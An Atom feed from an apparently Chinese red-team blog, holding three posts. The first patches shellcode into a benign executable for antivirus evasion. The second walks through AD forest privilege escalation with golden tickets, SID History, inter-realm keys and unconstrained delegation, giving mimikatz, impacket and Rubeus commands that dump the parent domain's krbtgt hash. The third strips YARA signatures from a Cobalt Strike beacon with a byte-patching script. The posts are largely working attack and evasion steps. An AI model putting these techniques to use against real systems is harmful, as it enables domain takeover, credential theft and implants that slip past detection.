<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>季伯常  Blog</title>
  
  
  <link href="https://www.jibochang.link/atom.xml" rel="self"/>
  
  <link href="https://www.jibochang.link/"/>
  <updated>2024-07-14T09:01:57.563Z</updated>
  <id>https://www.jibochang.link/</id>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>静态免杀之patch白文件</title>
    <link href="https://www.jibochang.link/2024/07/14/%E9%9D%99%E6%80%81%E5%85%8D%E6%9D%80%E4%B9%8Bpatch%E7%99%BD%E6%96%87%E4%BB%B6/"/>
    <id>https://www.jibochang.link/2024/07/14/%E9%9D%99%E6%80%81%E5%85%8D%E6%9D%80%E4%B9%8Bpatch%E7%99%BD%E6%96%87%E4%BB%B6/</id>
    <published>2024-07-13T16:00:00.000Z</published>
    <updated>2024-07-14T09:01:57.563Z</updated>
    
    <content type="html"><![CDATA[<p>之前在微信看到一篇文章<a href="https://mp.weixin.qq.com/s/nP0IqpGvGeWagmVsWtzC9">《三年了，还是VT全绿，它到底凭什么？》</a>，里面就讲述了样本的的一些方法，前段时间值守的时候抓了2个样本就用这个手法做的马，刚好这两天星球的fdx师傅写了如何手动patch，正好复现学习一下。</p><h2 id="准备条件"><a href="#准备条件" class="headerlink" title="准备条件"></a>准备条件</h2><p>首先要找一个白文件，随便到哪里找都行，找到之后需要这个exe不能有dll依赖，如下</p><p><img src="/2024/07/14/%E9%9D%99%E6%80%81%E5%85%8D%E6%9D%80%E4%B9%8Bpatch%E7%99%BD%E6%96%87%E4%BB%B6/image-20240714162431368.png" alt="image-20240714162431368"></p><p>找到一个可以双击没反应的就ok了，接着再看看exe是多少位的，用于后面编写shellcode，可以看出很明显是64位的</p><p><img src="/2024/07/14/%E9%9D%99%E6%80%81%E5%85%8D%E6%9D%80%E4%B9%8Bpatch%E7%99%BD%E6%96%87%E4%BB%B6/image-20240714165503630.png" alt="image-20240714165503630"></p><h2 id="寻找patch点"><a href="#寻找patch点" class="headerlink" title="寻找patch点"></a>寻找patch点</h2><p>接着就用ida去找可以patch的点，打开之后看winmain函数</p><p><img src="/2024/07/14/%E9%9D%99%E6%80%81%E5%85%8D%E6%9D%80%E4%B9%8Bpatch%E7%99%BD%E6%96%87%E4%BB%B6/image-20240714162804514.png" alt="image-20240714162804514"></p><p>接着查看里面调用了哪些函数，可以看到里面有很多的函数，需要我们去寻找</p><p><img src="/2024/07/14/%E9%9D%99%E6%80%81%E5%85%8D%E6%9D%80%E4%B9%8Bpatch%E7%99%BD%E6%96%87%E4%BB%B6/image-20240714162837373.png" alt="image-20240714162837373"></p><p>我这边已经找到了一个函数<code>sub_140003890</code></p><p><img src="/2024/07/14/%E9%9D%99%E6%80%81%E5%85%8D%E6%9D%80%E4%B9%8Bpatch%E7%99%BD%E6%96%87%E4%BB%B6/image-20240714162937406.png" alt="image-20240714162937406"></p><p>点函数名按x查找调用，发现是<code>sub_140003190</code>调用</p><p><img src="/2024/07/14/%E9%9D%99%E6%80%81%E5%85%8D%E6%9D%80%E4%B9%8Bpatch%E7%99%BD%E6%96%87%E4%BB%B6/image-20240714163100135.png" alt="image-20240714163100135"></p><p><img src="/2024/07/14/%E9%9D%99%E6%80%81%E5%85%8D%E6%9D%80%E4%B9%8Bpatch%E7%99%BD%E6%96%87%E4%BB%B6/image-20240714163133172.png" alt="image-20240714163133172"></p><p>再接着查找谁调用的<code>sub_140003190</code></p><p><img src="/2024/07/14/%E9%9D%99%E6%80%81%E5%85%8D%E6%9D%80%E4%B9%8Bpatch%E7%99%BD%E6%96%87%E4%BB%B6/image-20240714163201395.png" alt="image-20240714163201395"></p><p>发现是<code>sub_140004040</code>调用的，最后就回到了winmian函数</p><p><img src="/2024/07/14/%E9%9D%99%E6%80%81%E5%85%8D%E6%9D%80%E4%B9%8Bpatch%E7%99%BD%E6%96%87%E4%BB%B6/image-20240714163244110.png" alt="image-20240714163244110"></p><p>所以完整的调用链是winmain-&gt;sub_140004040-&gt;sub_140003190-&gt;sub_140003890，需要注意的是找的函数有几个条件</p><ol><li>函数要尽量大一些，如果太小没办法放下我们的shellcode</li><li>尽量要让程序能触发到这个函数，不然patch也没法触发等于白整</li></ol><h2 id="文件定位"><a href="#文件定位" class="headerlink" title="文件定位"></a>文件定位</h2><p>在得知了函数之后要找到在文件中的位置，在IDA中给的地址是VA，需要转换成FOA</p><p><img src="/2024/07/14/%E9%9D%99%E6%80%81%E5%85%8D%E6%9D%80%E4%B9%8Bpatch%E7%99%BD%E6%96%87%E4%BB%B6/image-20240714163747687.png" alt="image-20240714163747687"></p><p>用cff explorer可以转换，得到了函数开始位置在<code>00002C90</code>偏移处</p><p><img src="/2024/07/14/%E9%9D%99%E6%80%81%E5%85%8D%E6%9D%80%E4%B9%8Bpatch%E7%99%BD%E6%96%87%E4%BB%B6/image-20240714163854489.png" alt="image-20240714163854489"></p><p>接着再找一下函数结尾的偏移，在<code>000031F7</code>偏移处</p><p><img src="/2024/07/14/%E9%9D%99%E6%80%81%E5%85%8D%E6%9D%80%E4%B9%8Bpatch%E7%99%BD%E6%96%87%E4%BB%B6/image-20240714163952539.png" alt="image-20240714163952539"></p><p><img src="/2024/07/14/%E9%9D%99%E6%80%81%E5%85%8D%E6%9D%80%E4%B9%8Bpatch%E7%99%BD%E6%96%87%E4%BB%B6/image-20240714164022508.png" alt="image-20240714164022508"></p><p>然后就可以用winhex或者c32asm找到对应位置即可。</p><h2 id="shellcode编写"><a href="#shellcode编写" class="headerlink" title="shellcode编写"></a>shellcode编写</h2><p>接着就需要编写shellcode，shellcode是一段位置无关的代码，所以要编写shellcode就要用动态函数进行调用，读取PEB，自实现GerProAddress，还有字符串需要放在text段中，github上有很多模板，这里就**<a href="https://github.com/clownfive/CppDevShellcode">CppDevShellcode</a>**来编写，按照作者的说明来就好，生成之后提取text段的内容</p><p><img src="/2024/07/14/%E9%9D%99%E6%80%81%E5%85%8D%E6%9D%80%E4%B9%8Bpatch%E7%99%BD%E6%96%87%E4%BB%B6/image-20240714164517080.png" alt="image-20240714164517080"></p><p>开始位置在400，用c32提取出来</p><p><img src="/2024/07/14/%E9%9D%99%E6%80%81%E5%85%8D%E6%9D%80%E4%B9%8Bpatch%E7%99%BD%E6%96%87%E4%BB%B6/image-20240714164606356.png" alt="image-20240714164606356"></p><p><img src="/2024/07/14/%E9%9D%99%E6%80%81%E5%85%8D%E6%9D%80%E4%B9%8Bpatch%E7%99%BD%E6%96%87%E4%BB%B6/image-20240714164623435.png" alt="image-20240714164623435"></p><p>最后这里30 c3后面的00可以不用，然后写个loader测试一下shellcode能不能正常运行</p><p><img src="/2024/07/14/%E9%9D%99%E6%80%81%E5%85%8D%E6%9D%80%E4%B9%8Bpatch%E7%99%BD%E6%96%87%E4%BB%B6/image-20240714164805940.png" alt="image-20240714164805940"></p><p>可以成功运行，说明shellcode没问题</p><h2 id="patch替换"><a href="#patch替换" class="headerlink" title="patch替换"></a>patch替换</h2><p>最后只需要在对应的文件内替换提取出来的shellcode即可</p><p><img src="/2024/07/14/%E9%9D%99%E6%80%81%E5%85%8D%E6%9D%80%E4%B9%8Bpatch%E7%99%BD%E6%96%87%E4%BB%B6/image-20240714165042733.png" alt="image-20240714165042733"></p><p>替换之后打开就会弹出hello</p><p><img src="/2024/07/14/%E9%9D%99%E6%80%81%E5%85%8D%E6%9D%80%E4%B9%8Bpatch%E7%99%BD%E6%96%87%E4%BB%B6/image-20240714165116223.png" alt="image-20240714165116223"></p><p>后续可以写一下加载cs的shellcode，建议使用远程加载或者使用资源读取，再配合一些反沙箱就可以达到不错的效果</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;之前在微信看到一篇文章&lt;a href=&quot;https://mp.weixin.qq.com/s/nP0IqpGvGeWagmVsWtzC9&quot;&gt;《三年了，还是VT全绿，它到底凭什么？》&lt;/a&gt;，里面就讲述了样本的的一些方法，前段时间值守的时候抓了2个样本就用这个手法做的马，刚好</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>跨域攻击</title>
    <link href="https://www.jibochang.link/2024/06/30/%E8%B7%A8%E5%9F%9F%E6%94%BB%E5%87%BB/"/>
    <id>https://www.jibochang.link/2024/06/30/%E8%B7%A8%E5%9F%9F%E6%94%BB%E5%87%BB/</id>
    <published>2024-06-29T16:00:00.000Z</published>
    <updated>2024-06-30T05:22:24.747Z</updated>
    
    <content type="html"><![CDATA[<p>前段时间帮几个客户做AD攻击面排查，发现有域林，但跨域攻击还不太会，看网上相关文章也不多，特地记录一下几种攻击方式。</p><h2 id="环境介绍"><a href="#环境介绍" class="headerlink" title="环境介绍"></a>环境介绍</h2><p>父域：<code>moon.lab</code>   两个域控 ad-server.moon.lab  &#x3D; 10.10.10.1 certserver.moon.lab &#x3D; 10.10.10.2</p><p>子域：<code>a.moob.lab</code> 一个域控 B-AD.a.moon.lab &#x3D; 10.10.10.5</p><hr><p>目前已经控制了子域的一台机器当做入口点，由于懒得打域控，就直接用域管账号密码，当做是拿下域控后进行操作</p><p><img src="/2024/06/30/%E8%B7%A8%E5%9F%9F%E6%94%BB%E5%87%BB/image-20240622170613764.png" alt="image-20240622170613764"></p><h2 id="黄金票据-SID-History"><a href="#黄金票据-SID-History" class="headerlink" title="黄金票据 + SID History"></a>黄金票据 + SID History</h2><p>要使用黄金票据+<code>SIDHistory</code><strong>必须</strong>要有以下几个条件</p><ol><li>当前域SID</li><li>父域Enterprise Admins账户的SID</li><li>当前域<code>krbtgt</code>账户的hash</li></ol><p>krbtgt的hash通过dcsync去获取就行了</p><p>以下演示一下如何获得以上信息，首先是当前域的SID，可以通过<code>adfind</code>、<code>adexplorer</code>获得</p><h3 id="查询SID"><a href="#查询SID" class="headerlink" title="查询SID"></a>查询SID</h3><h4 id="ADExplorer"><a href="#ADExplorer" class="headerlink" title="ADExplorer"></a>ADExplorer</h4><p>连接上adexplorer之后点击当前域查看objectSid属性</p><p><img src="/2024/06/30/%E8%B7%A8%E5%9F%9F%E6%94%BB%E5%87%BB/image-20240622174017426.png" alt="image-20240622174017426"></p><p>成功获得sid为<code>S-1-5-21-3630734435-3836532205-689166442</code></p><h4 id="Adfind"><a href="#Adfind" class="headerlink" title="Adfind"></a>Adfind</h4><p>使用以下命令指定查询administroatr用户的sid</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adfind.exe -sc u:administrator objectsid</span><br></pre></td></tr></table></figure><p><img src="/2024/06/30/%E8%B7%A8%E5%9F%9F%E6%94%BB%E5%87%BB/image-20240622174913698.png" alt="image-20240622174913698"></p><p>这里查询出两个用户的SID，一个是父域的一个是子域。</p><p>而父域的Enterprise Admins用户的SID为父域SID-519即<code>S-1-5-21-4135803656-2414268689-2214011370-519</code></p><h3 id="伪造票据"><a href="#伪造票据" class="headerlink" title="伪造票据"></a>伪造票据</h3><p>现在整理一下前面收集的信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">krbtgt hash：1d5267a559913316b91e6e5de976d7b7</span><br><span class="line">子域sid：S-1-5-21-3630734435-3836532205-689166442</span><br><span class="line">Enterprise Admins的SID：S-1-5-21-4135803656-2414268689-2214011370-519</span><br></pre></td></tr></table></figure><p>接着伪造黄金票据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /user:Administrator /domain:a.moon.lab /sid:S-1-5-21-3630734435-3836532205-689166442 /sids:S-1-5-21-4135803656-2414268689-2214011370-519 /krbtgt:1d5267a559913316b91e6e5de976d7b7 /ptt</span><br></pre></td></tr></table></figure><p><img src="/2024/06/30/%E8%B7%A8%E5%9F%9F%E6%94%BB%E5%87%BB/image-20240622175624459.png" alt="image-20240622175624459"></p><p>接着用dcsync去dump父域的hash测试是否成功</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz lsadump::dcsync /domain:moon.lab /user:moonlab\krbtgt</span><br></pre></td></tr></table></figure><p><img src="/2024/06/30/%E8%B7%A8%E5%9F%9F%E6%94%BB%E5%87%BB/image-20240622175920265.png" alt="image-20240622175920265"></p><p>可以看到成功的导出，说明成功拿到父域权限</p><h2 id="inter-realm-key-SID-History"><a href="#inter-realm-key-SID-History" class="headerlink" title="inter-realm key+SID History"></a>inter-realm key+SID History</h2><p>跨域和普通的域认证有所不同，跨域认证需要个 inter-realm key，这个key就在两个信任域当中都存在。获取到 inter-realm key 就能制作访问其他域任意服务的 ST 服务票据了。然后在 ST 服务票据中加上企业管理员的 SID History，就可以以企业管理员权限访问域林中的任意服务。</p><hr><p>那么该如何拿到这个key呢？只要获得了域林中任意域的域控制器权限，即可通过相关工具查询出key。</p><p>以下演示一下如何通过mimikatz和impacket工具获取这个key</p><h3 id="获取inter-realm-key"><a href="#获取inter-realm-key" class="headerlink" title="获取inter-realm key"></a>获取inter-realm key</h3><h4 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h4><p>需要在域控上执行以下命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz lsadump::turst /patch</span><br></pre></td></tr></table></figure><p><img src="/2024/06/30/%E8%B7%A8%E5%9F%9F%E6%94%BB%E5%87%BB/image-20240622192809316.png" alt="image-20240622192809316"></p><p>需要看从子域到父域的rc4_hmac_nt就是key</p><p>正常都知道在域内加了$符号的是机器账户。在域林内就不一样，在users组中带有$符号的就是信任账户，信任账户的ntlmhash就是key，所以我们去获取这个账户的hash即可。有以下两种方式找到这个账户</p><h5 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>powershell</h5><p>使用这句就能查到，但实战中可能环境问题powershell不方便，可以用另外一种方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-ADUser -filter * -Properties DistinguishedName,samAccountType | ?&#123;$_. name -like &quot;*$&quot;&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/06/30/%E8%B7%A8%E5%9F%9F%E6%94%BB%E5%87%BB/image-20240622193451572.png" alt="image-20240622193451572"></p><h5 id="Adfind-1"><a href="#Adfind-1" class="headerlink" title="Adfind"></a>Adfind</h5><p>打开users组就能看到，实战推荐用这个查找</p><p><img src="/2024/06/30/%E8%B7%A8%E5%9F%9F%E6%94%BB%E5%87%BB/image-20240622193540363.png" alt="image-20240622193540363"></p><p>之后通过secretsdump获取hash即可</p><p><img src="/2024/06/30/%E8%B7%A8%E5%9F%9F%E6%94%BB%E5%87%BB/image-20240622193803977.png" alt="image-20240622193803977"></p><h4 id="伪造票据-1"><a href="#伪造票据-1" class="headerlink" title="伪造票据"></a>伪造票据</h4><p>总结一下上面的信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">key hash：f6e0688688a20c4fbc217cc139926300</span><br><span class="line">子域sid：S-1-5-21-3630734435-3836532205-689166442</span><br><span class="line">Enterprise Admins的SID：S-1-5-21-4135803656-2414268689-2214011370-519</span><br></pre></td></tr></table></figure><p>然后用ticketer.py去申请个TGT票据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 ticketer.py -nthash f6e0688688a20c4fbc217cc139926300 -domain-sid S-1-5-21-3630734435-3836532205-689166442 -extra-sid S-1-5-21-4135803656-2414268689-2214011370-519 -domain a.moon.lab -spn krbtgt/moon.lab administrator</span><br></pre></td></tr></table></figure><p><img src="/2024/06/30/%E8%B7%A8%E5%9F%9F%E6%94%BB%E5%87%BB/image-20240622194113186.png" alt="image-20240622194113186"></p><p>申请完TGT票据需要导入一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export KRB5CCNAME=administrator.ccache</span><br></pre></td></tr></table></figure><p><img src="/2024/06/30/%E8%B7%A8%E5%9F%9F%E6%94%BB%E5%87%BB/image-20240622194146585.png" alt="image-20240622194146585"></p><p>可以用<code>klist -l</code>查看</p><p><img src="/2024/06/30/%E8%B7%A8%E5%9F%9F%E6%94%BB%E5%87%BB/image-20240622194206891.png" alt="image-20240622194206891"></p><p>接着去申请一个父域CIFS的ST票据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 getST.py -k -no-pass -spn cifs/ad-server.moon.lab -dc-ip 10.10.10.1 moon.lab/administraotr</span><br></pre></td></tr></table></figure><p>这里有个坑，在申请的时候会提示Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)这个就是时间不同步的，只要改一下时间就可以，但是这里得要同步的时间不是父域的时间</p><p><img src="/2024/06/30/%E8%B7%A8%E5%9F%9F%E6%94%BB%E5%87%BB/image-20240622194428394.png" alt="image-20240622194428394"></p><p>这个时间是父域的时间，但是也不太对，后面改成子域的时间就ok了</p><p><img src="/2024/06/30/%E8%B7%A8%E5%9F%9F%E6%94%BB%E5%87%BB/image-20240622194528869.png" alt="image-20240622194528869"></p><p>接着再导入一下ST票据，然后用secretsdump去导出父域的hash，成功导出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 secretsdump.py -no-pass -k a.moon.lab/administrator@ad-server.moon.lab -just-dc-user &quot;moonlab\krbtgt&quot; -dc-ip 10.10.10.1</span><br></pre></td></tr></table></figure><p><img src="/2024/06/30/%E8%B7%A8%E5%9F%9F%E6%94%BB%E5%87%BB/image-20240622194725710.png" alt="image-20240622194725710"></p><h2 id="非约束委派"><a href="#非约束委派" class="headerlink" title="非约束委派"></a>非约束委派</h2><p>在域控上默认是开非约束委派的，所以当我们拿到子域的域控，就可以利用非约束委派来攻击父域的域控。</p><p>要用rubeus进行监听</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe monitor /interval:1 /filteruser:AD-SERVER$ /nowrap</span><br></pre></td></tr></table></figure><p>接着就用printerbug或者PetitPotam打触发就ok</p><p><img src="/2024/06/30/%E8%B7%A8%E5%9F%9F%E6%94%BB%E5%87%BB/image-20240622205812668.png" alt="image-20240622205812668"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;前段时间帮几个客户做AD攻击面排查，发现有域林，但跨域攻击还不太会，看网上相关文章也不多，特地记录一下几种攻击方式。&lt;/p&gt;
&lt;h2 id=&quot;环境介绍&quot;&gt;&lt;a href=&quot;#环境介绍&quot; class=&quot;headerlink&quot; title=&quot;环境介绍&quot;&gt;&lt;/a&gt;环境介绍&lt;/h2</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>去除cobaltstrike的Yara签名特征</title>
    <link href="https://www.jibochang.link/2024/03/01/%E5%8E%BB%E9%99%A4cobaltstrike%E7%9A%84Yara%E7%AD%BE%E5%90%8D%E7%89%B9%E5%BE%81/"/>
    <id>https://www.jibochang.link/2024/03/01/%E5%8E%BB%E9%99%A4cobaltstrike%E7%9A%84Yara%E7%AD%BE%E5%90%8D%E7%89%B9%E5%BE%81/</id>
    <published>2024-02-29T16:00:00.000Z</published>
    <updated>2024-03-01T08:40:46.364Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>大家都知道cs默认是有很多特征的，但我们可以用profile去除掉很多的特征，基础的修改就不多说，网上很多文章，这里用团队的profile来检测一下生成的raw有多少规则，用的是Elastic的规则。</p><h2 id="规则检测"><a href="#规则检测" class="headerlink" title="规则检测"></a>规则检测</h2><p>先用cs生成一个无阶段的raw文件(如果有udrl的记得unload)</p><p><img src="/2024/03/01/%E5%8E%BB%E9%99%A4cobaltstrike%E7%9A%84Yara%E7%AD%BE%E5%90%8D%E7%89%B9%E5%BE%81/image-20240301145834328.png" alt="image-20240301145834328"></p><p>然后用yara检测一下，发现还是有不少特征的，一条条的来。</p><p><img src="/2024/03/01/%E5%8E%BB%E9%99%A4cobaltstrike%E7%9A%84Yara%E7%AD%BE%E5%90%8D%E7%89%B9%E5%BE%81/image-20240301153634476.png" alt="image-20240301153634476"></p><p><img src="/2024/03/01/%E5%8E%BB%E9%99%A4cobaltstrike%E7%9A%84Yara%E7%AD%BE%E5%90%8D%E7%89%B9%E5%BE%81/image-20240301154306510.png" alt="image-20240301154306510"></p><h2 id="Windows-Trojan-CobaltStrike-f0b627fc"><a href="#Windows-Trojan-CobaltStrike-f0b627fc" class="headerlink" title="Windows_Trojan_CobaltStrike_f0b627fc"></a>Windows_Trojan_CobaltStrike_f0b627fc</h2><p><img src="/2024/03/01/%E5%8E%BB%E9%99%A4cobaltstrike%E7%9A%84Yara%E7%AD%BE%E5%90%8D%E7%89%B9%E5%BE%81/image-20240301155059667.png" alt="image-20240301155059667"></p><p>先dbg来调试查看，在CPU中，搜索-&gt;所有模块-&gt;匹配特征</p><p><img src="/2024/03/01/%E5%8E%BB%E9%99%A4cobaltstrike%E7%9A%84Yara%E7%AD%BE%E5%90%8D%E7%89%B9%E5%BE%81/image-20240301153857571.png" alt="image-20240301153857571"></p><p>然后把刚刚查出来的十六进制丢进去搜索</p><p><img src="/2024/03/01/%E5%8E%BB%E9%99%A4cobaltstrike%E7%9A%84Yara%E7%AD%BE%E5%90%8D%E7%89%B9%E5%BE%81/image-20240301154002210.png" alt="image-20240301154002210"></p><p><img src="/2024/03/01/%E5%8E%BB%E9%99%A4cobaltstrike%E7%9A%84Yara%E7%AD%BE%E5%90%8D%E7%89%B9%E5%BE%81/image-20240301154005703.png" alt="image-20240301154005703"></p><p>出现了两条，先点第一个进去，发现就是这两行，复制一下内存地址，然后ctrl+g 跳转过去</p><p><img src="/2024/03/01/%E5%8E%BB%E9%99%A4cobaltstrike%E7%9A%84Yara%E7%AD%BE%E5%90%8D%E7%89%B9%E5%BE%81/image-20240301154033603.png" alt="image-20240301154033603"></p><p><img src="/2024/03/01/%E5%8E%BB%E9%99%A4cobaltstrike%E7%9A%84Yara%E7%AD%BE%E5%90%8D%E7%89%B9%E5%BE%81/image-20240301154111033.png" alt="image-20240301154111033"></p><p>这里就是规则点，看看一下汇编</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">and eax,FFFFF</span><br><span class="line">cmp eax,414141</span><br><span class="line">jne baseloader.7FF61DAA95A3</span><br></pre></td></tr></table></figure><p>这里汇编就是用eax去比较是否是414141，直接修改一下代码用mov eax,414141让他逻辑正常</p><p><img src="/2024/03/01/%E5%8E%BB%E9%99%A4cobaltstrike%E7%9A%84Yara%E7%AD%BE%E5%90%8D%E7%89%B9%E5%BE%81/image-20240301154331459.png" alt="image-20240301154331459"></p><p>改好之后补丁一下，再去扫描一下</p><p><img src="/2024/03/01/%E5%8E%BB%E9%99%A4cobaltstrike%E7%9A%84Yara%E7%AD%BE%E5%90%8D%E7%89%B9%E5%BE%81/image-20240301154432502.png" alt="image-20240301154432502"></p><p>发现确实少了一条，另外一条就是上面看到的另外一个，也一起修改一下</p><p><img src="/2024/03/01/%E5%8E%BB%E9%99%A4cobaltstrike%E7%9A%84Yara%E7%AD%BE%E5%90%8D%E7%89%B9%E5%BE%81/image-20240301154745345.png" alt="image-20240301154745345"></p><p>bypass之后测试上线正常</p><p><img src="/2024/03/01/%E5%8E%BB%E9%99%A4cobaltstrike%E7%9A%84Yara%E7%AD%BE%E5%90%8D%E7%89%B9%E5%BE%81/image-20240301154944816.png" alt="image-20240301154944816"></p><p>直接用python来改</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">replace_bytes</span>(<span class="params">input_filename, output_filename</span>):</span><br><span class="line">    search_bytes      = <span class="string">b&quot;\x25\xff\xff\xff\x00\x3d\x41\x41\x41\x00&quot;</span></span><br><span class="line">    replacement_bytes = <span class="string">b&quot;\xb8\x41\x41\x41\x00\x3D\x41\x41\x41\x00&quot;</span></span><br><span class="line">  </span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(input_filename, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> input_file:</span><br><span class="line">        content = input_file.read()</span><br><span class="line">        modified_content = content.replace(search_bytes, replacement_bytes)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(output_filename, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> output_file:</span><br><span class="line">        output_file.write(modified_content)</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Modified content saved to <span class="subst">&#123;output_filename&#125;</span>.&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Example usage</span></span><br><span class="line">input_filename = <span class="string">&quot;beacon_x64.bin&quot;</span></span><br><span class="line">output_filename = <span class="string">&quot;output.bin&quot;</span></span><br><span class="line">replace_bytes(input_filename, output_filename)</span><br></pre></td></tr></table></figure><h2 id="Windows-Trojan-CobaltStrike-1787eef5"><a href="#Windows-Trojan-CobaltStrike-1787eef5" class="headerlink" title="Windows_Trojan_CobaltStrike_1787eef5"></a>Windows_Trojan_CobaltStrike_1787eef5</h2><p><img src="/2024/03/01/%E5%8E%BB%E9%99%A4cobaltstrike%E7%9A%84Yara%E7%AD%BE%E5%90%8D%E7%89%B9%E5%BE%81/image-20240301155047094.png" alt="image-20240301155047094"></p><p>这个规则很明显是PE头4D5A的特征，直接用profile来修改PE头信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set magic_mz_x64    &quot;AABB&quot;;</span><br><span class="line">set magic_mz_x86    &quot;CCDD&quot;;</span><br></pre></td></tr></table></figure><p>改好就直接bypass了</p><p><img src="/2024/03/01/%E5%8E%BB%E9%99%A4cobaltstrike%E7%9A%84Yara%E7%AD%BE%E5%90%8D%E7%89%B9%E5%BE%81/image-20240301155527020.png" alt="image-20240301155527020"></p><h2 id="Windows-Trojan-CobaltStrike-3dc22d14"><a href="#Windows-Trojan-CobaltStrike-3dc22d14" class="headerlink" title="Windows_Trojan_CobaltStrike_3dc22d14"></a>Windows_Trojan_CobaltStrike_3dc22d14</h2><p><img src="/2024/03/01/%E5%8E%BB%E9%99%A4cobaltstrike%E7%9A%84Yara%E7%AD%BE%E5%90%8D%E7%89%B9%E5%BE%81/image-20240301155830154.png" alt="image-20240301155830154"></p><p>这个%02d在c里面是数字宽度2,位置不足左边补0，%.2d和%02d效果一样，直接修改一下</p><p><img src="/2024/03/01/%E5%8E%BB%E9%99%A4cobaltstrike%E7%9A%84Yara%E7%AD%BE%E5%90%8D%E7%89%B9%E5%BE%81/image-20240301160200556.png" alt="image-20240301160200556"></p><p>修改之后也是没检测出来了</p><p><img src="/2024/03/01/%E5%8E%BB%E9%99%A4cobaltstrike%E7%9A%84Yara%E7%AD%BE%E5%90%8D%E7%89%B9%E5%BE%81/image-20240301160231560.png" alt="image-20240301160231560"></p><p>最后也是能成功上线</p><p><img src="/2024/03/01/%E5%8E%BB%E9%99%A4cobaltstrike%E7%9A%84Yara%E7%AD%BE%E5%90%8D%E7%89%B9%E5%BE%81/image-20240301160252804.png" alt="image-20240301160252804"></p><p>为了方便直接在profile里面用strrep替换就行了</p><p><img src="/2024/03/01/%E5%8E%BB%E9%99%A4cobaltstrike%E7%9A%84Yara%E7%AD%BE%E5%90%8D%E7%89%B9%E5%BE%81/image-20240301162956905.png" alt="image-20240301162956905"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;大家都知道cs默认是有很多特征的，但我们可以用profile去除掉很多的特征，基础的修改就不多说，网上很多文章，这里用团队的profile来</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>应急响应-pf文件缓存</title>
    <link href="https://www.jibochang.link/2024/02/16/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-pf%E6%96%87%E4%BB%B6%E7%BC%93%E5%AD%98/"/>
    <id>https://www.jibochang.link/2024/02/16/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-pf%E6%96%87%E4%BB%B6%E7%BC%93%E5%AD%98/</id>
    <published>2024-02-16T14:28:00.000Z</published>
    <updated>2024-02-18T11:30:35.345Z</updated>
    
